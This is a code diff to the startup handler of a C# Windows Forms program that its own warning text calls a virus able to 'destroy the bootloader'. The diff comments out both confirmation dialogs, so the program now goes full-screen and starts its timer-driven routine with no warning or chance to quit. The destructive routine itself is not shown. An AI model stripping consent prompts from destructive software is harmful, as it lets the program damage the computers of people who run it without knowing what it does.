@@ -37,35 +37,36 @@ namespace System64
 
 		private void Form1_Load(object sender, EventArgs e)
 		{
-			if (!WithWarningDialogs)
-			{
+			//if (!WithWarningDialogs)
+			//{
 				this.FormBorderStyle = FormBorderStyle.None;
 				this.WindowState = FormWindowState.Maximized;
 				timer1.Start();
-			} else if (WithWarningDialogs)
-			{
-				DialogResult firstwarning = MessageBox.Show("This virus is no joke, do you want to run?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
-				if (firstwarning == DialogResult.Yes)
-				{
-					DialogResult secondwarning = MessageBox.Show("THIS IS THE LAST WARNING, IT WILL DESTROY THE BOOTLOADER WE ARE NOT RESPONSIBLE FOR ANY DAMAGES THIS IS JUST FOR FUN, ARE YOU SURE YOU WANT TO RUN IT?", "LAST WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Stop);
-					if (secondwarning == DialogResult.Yes)
-					{
-						this.FormBorderStyle = FormBorderStyle.None;
-						this.WindowState = FormWindowState.Maximized;
-						timer1.Start();
-					}
-					else if (secondwarning == DialogResult.No)
-					{
-						this.Close();
-						Application.Exit();
-					}
-				}
-				else if (firstwarning == DialogResult.No)
-				{
-					this.Close();
-					Application.Exit();
-				}
-			}
+			//} 
+		//else if (WithWarningDialogs)
+		//{
+		//	DialogResult firstwarning = MessageBox.Show("This virus is no joke, do you want to run?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
+		//	if (firstwarning == DialogResult.Yes)
+		//	{
+		//		DialogResult secondwarning = MessageBox.Show("THIS IS THE LAST WARNING, IT WILL DESTROY THE BOOTLOADER WE ARE NOT RESPONSIBLE FOR ANY DAMAGES THIS IS JUST FOR FUN, ARE YOU SURE YOU WANT TO RUN IT?", "LAST WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Stop);
+		//		if (secondwarning == DialogResult.Yes)
+		//		{
+		//			this.FormBorderStyle = FormBorderStyle.None;
+		//			this.WindowState = FormWindowState.Maximized;
+		//			timer1.Start();
+		//		}
+		//		else if (secondwarning == DialogResult.No)
+		//		{
+		//			this.Close();
+		//			Application.Exit();
+		//		}
+		//	}
+		//	else if (firstwarning == DialogResult.No)
+		//	{
+		//		this.Close();
+		//		Application.Exit();
+		//	}
+		//}
 		}
 
 
